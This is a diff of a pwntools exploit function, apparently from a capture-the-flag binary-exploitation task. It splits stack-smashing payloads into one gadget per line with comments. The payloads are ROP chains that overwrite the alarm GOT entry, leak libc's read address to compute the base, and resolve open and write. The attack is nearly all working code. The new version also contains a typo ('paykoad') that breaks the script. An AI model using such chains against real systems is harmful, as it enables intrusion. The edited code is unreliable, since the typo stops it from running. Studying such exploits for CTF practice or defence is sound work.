@@ -18,19 +18,47 @@ def exploit(p):
 	rbp=0x601090+0x10
 	read=0x400790
 	poprbp=0x0000000000400a01
-	payload='a'*8+p64(alarmGot+8-0x18)+p64(readIns)
+	payload='a'*8		# padding
+	payload+=p64(alarmGot+8-0x18)	# rbp
+	payload+=p64(readIns)	# call readStr
 	p.sendline(payload)
-	payload="a"*8+p64(rbp)+p64(readIns)+'\x05'
+	# over write alarm
+	payload="a"*8
+	payload+=p64(rbp)
+	payload+=p64(readIns)
+	payload+='\x05' # byte overwrite
 	p.send(payload)
 	time.sleep(5)
+	
 	# read 0x100 bytes
-	payload='a'*8+p64(rbp+0x50)+p64(rdi)+p64(rbp-8+0x60)+p64(rsi_r15)+p64(0x100)+p64(0)+p64(readIns+12)
+	payload='a'*8
+	payload+=p64(rbp+0x50)
+	payload+=p64(rdi)
+	payload+=p64(rbp-8+0x60)
+	payload+=p64(rsi_r15)
+	payload+=p64(0x100)
+	payload+=p64(0)
+	payload+=p64(readIns+12)
 	p.send(payload)
 	# read n bytes ket qua tra ve luu trong rax
 	payload="a"*0x30
-	payload+=p64(rdi)+p64(0)+p64(rsi_r15)+p64(rbp+0x100)+p64(0)+p64(read)
-	# goi syscall
-	payload+=p64(rdi)+p64(1)+p64(rsi_r15)+p64(readGot)+p64(0)+p64(alarm)+p64(poprbp)+p64(rbp+0x200)+p64(readIns)
+	payload+=p64(rdi)
+	payload+=p64(0)
+	payload+=p64(rsi_r15)
+	payload+=p64(rbp+0x100)
+	payload+=p64(0)
+	payload+=p64(read)
+	# goi syscall write
+	payload+=p64(rdi)
+	payload+=p64(1)
+	payload+=p64(rsi_r15)
+	payload+=p64(readGot)
+	payload+=p64(0)
+	payload+=p64(alarm)
+	payload+=p64(poprbp)
+	payload+=p64(rbp+0x200)
+	
+	payload+=p64(readIns)
 	p.sendline(payload)
 	time.sleep(5)
 	p.sendline('')
@@ -40,9 +68,18 @@ def exploit(p):
 	info("read is 0x%x\nbase is 0x%x"%(readL,base))
 
 	# read 0x100 bytes
-	info("0x%x"%(rbp+0x50))
-	payload='a'*8+p64(rbp+0x50)+p64(rdi)+p64(rbp+0x200)+p64(rsi_r15)+p64(0x100)+p64(0)
-	payload+=p64(readIns+12)+p64(poprbp)+p64(rbp+0x200-8)+p64(0x400A99)
+
+	payload='a'*8
+	paykoad+=p64(rbp+0x50)
+	payload+=p64(rdi)
+	payload+=p64(rbp+0x200)
+	payload+=p64(rsi_r15)
+	payload+=p64(0x100)
+	payload+=p64(0)
+	payload+=p64(readIns+12)
+	payload+=p64(poprbp)
+	payload+=p64(rbp+0x200-8)
+	payload+=p64(0x400A99)
 	p.send(payload)
 	write=base+libc.symbols['write']
 	openf=base+libc.symbols['open']
